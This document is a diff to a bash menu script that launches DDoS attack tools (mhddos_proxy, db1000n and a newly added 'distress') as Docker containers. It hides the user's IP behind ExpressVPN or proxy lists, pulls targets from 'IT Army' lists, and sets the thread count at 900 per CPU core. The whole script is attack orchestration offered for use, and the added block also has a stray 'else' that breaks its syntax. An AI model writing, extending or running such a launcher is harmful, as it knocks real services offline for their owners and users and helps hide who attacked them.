@@ -10,6 +10,7 @@ EXPRESSVPN_CODE=`cat expressvpn_activation_code`
 
 MHDDOS_PROXY_SOURCE="ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest"
 DB1000N_SOURCE="ghcr.io/arriven/db1000n:latest"
+DISTRESS_SOURCE="ghcr.io/yneth/distress:latest"
 
 # Colors
 GREEN='\033[1;32m'
@@ -52,7 +53,8 @@ ${RESET}
 ${YELLOW}Select DDOS utility: ${RESET}
 ${YELLOW}1.${RESET} mhddos_proxy
 ${YELLOW}2.${RESET} db1000n
-${YELLOW}3.${RESET} Exit
+${YELLOW}3.${RESET} distress
+${YELLOW}4.${RESET} Exit
 Choose an option: "
     read -r option
     case $option in
@@ -63,6 +65,9 @@ Choose an option: "
         db1000n_configure
         ;;
     3)
+        distress_configure
+        ;;
+    4)
         exit 0
         ;;
     *)
@@ -103,9 +108,9 @@ expressvpn_configure () {
 mhddos_configure () {
     echo -ne "
 ${YELLOW}Select mhddos_proxy VPN type:${RESET}
-1. Use my ExpressVPN
-2. Use MHDDOS_PROXY proxy list without ExpressVPN
-3. Use my ExpressVPN with MHDDOS_PROXY proxy list
+1. Use my ExpressVPN IP
+2. Use MHDDOS_PROXY proxy list
+3. Use my ExpressVPN IP + MHDDOS_PROXY proxy list
 Choose an option:  "
     read -r vpn
 
@@ -245,8 +250,8 @@ mhddos_run () {
 db1000n_configure () {
     echo -ne "
 ${YELLOW}SELECT db1000n VPN TYPE:${RESET}
-1. Use my ExpressVPN
-2. Don't use VPN (not recommended)
+1. Use my ExpressVPN IP
+2. Don't use my ExpressVPN IP (not recommended)
 Choose an option:  "
     read -r vpn
 
@@ -286,6 +291,83 @@ db1000n_run () {
     fi
   fi
 }
+
+distress_configure () {
+    echo -ne "
+${YELLOW}Select distress VPN type:${RESET}
+1. Use my ExpressVPN IP
+2. Use distress proxy proxy list
+3. Use my ExpressVPN IP + distress proxy list
+
+Choose an option:  "
+    read -r vpn
+
+    echo -ne "
+${YELLOW}Select distress source of targets:${RESET}
+1. Use --itarmy flag (targets are formed by IT army)
+Choose an option:  "
+    read -r source_of_targets
+
+  distress_run
+}
+
+distress_threads () {
+  CPU_NUMBER=`getconf _NPROCESSORS_ONLN`
+  DISTRESS_THREADS=`expr $CPU_NUMBER \* 900`
+}
+
+distress_run () {
+  # Calculate the number of threads
+  distress_threads
+
+  # Set up URL with targets
+  if [ $source_of_targets == "2" ]; then
+    echo -e "\n${YELLOW}Paste URL with targets for distress:${RESET}"
+    read -r source_of_targets_url
+  fi
+
+  echo -e "\n${YELLOW}Preparing to run: ${RESET}"
+
+  # Run distress using ExpressVPN IP. Targets: --itarmy
+  if [ $vpn == "1" -a $source_of_targets == "1" ]; then
+    echo -e "${YELLOW}Utility:             ${RESET} ${GREEN}distress ${RESET}"
+    echo -e "${YELLOW}ExpressVPN:          ${RESET} ${GREEN}enabled ${RESET}"
+    echo -e "${YELLOW}Distress proxy list: ${RESET} ${RED}disabled ${RESET}"
+    echo -e "${YELLOW}Distress threads:    ${RESET} ${GREEN}$DISTRESS_THREADS ${RESET}"
+    echo -e "${YELLOW}Targets:             ${RESET} ${GREEN}IT Army ${RESET}"
+    expressvpn_configure
+    echo -e "${YELLOW}Wait till container is running...${RESET}"
+    sleep 10
+    docker run -it --rm --name distress_container --pull always $DISTRESS_SOURCE -c $DISTRESS_THREADS -u 100
+  fi
+
+  # Run distress using distress proxy list. Targets: --itarmy
+  if [ $vpn == "2" -a $source_of_targets == "1" ]; then
+    echo -e "${YELLOW}Utility:            ${RESET} ${GREEN}DISTRESS ${RESET}"
+    echo -e "${YELLOW}ExpressVPN:         ${RESET} ${RED}disabled ${RESET}"
+    echo -e "${YELLOW}Distress proxy list:  ${RESET} ${GREEN}enabled ${RESET}"
+    echo -e "${YELLOW}Distress threads:     ${RESET} ${GREEN}$DISTRESS_THREADS ${RESET}"
+    echo -e "${YELLOW}Targets:            ${RESET} ${GREEN}IT Army ${RESET}"
+    expressvpn disconnect
+    sleep 5
+    docker run -it --rm --name distress_container --pull always $DISTRESS_SOURCE -c $DISTRESS_THREADS -t targets.txt
+  fi
+
+  # Run distress using proxy list with ExpressVPN. Targets: --itarmy
+  if [ $vpn == "3" -a $source_of_targets == "1" ]; then
+    echo -e "${YELLOW}Utility:            ${RESET} ${GREEN}DISTRESS ${RESET}"
+    echo -e "${YELLOW}ExpressVPN:         ${RESET} ${RED}enabled ${RESET}"
+    echo -e "${YELLOW}Distress proxy list:  ${RESET} ${GREEN}enabled ${RESET}"
+    echo -e "${YELLOW}Distress threads:     ${RESET} ${GREEN}$DISTRESS_THREADS ${RESET}"
+    echo -e "${YELLOW}Targets:            ${RESET} ${GREEN}IT Army ${RESET}"
+    expressvpn_configure
+    docker run -it --rm --name distress_container --pull always $DISTRESS_SOURCE -c $DISTRESS_THREADS -t targets.txt
+  fi
+  else
+    echo -e "${RED}Error: Unknown parameter${RESET}"; exit 1
+  fi
+}
+
 
 [ "$LOGNAME" != "root" ] && echo -e "${RED}You must be 'root' to run the script!${RESET}" && exit 1
 
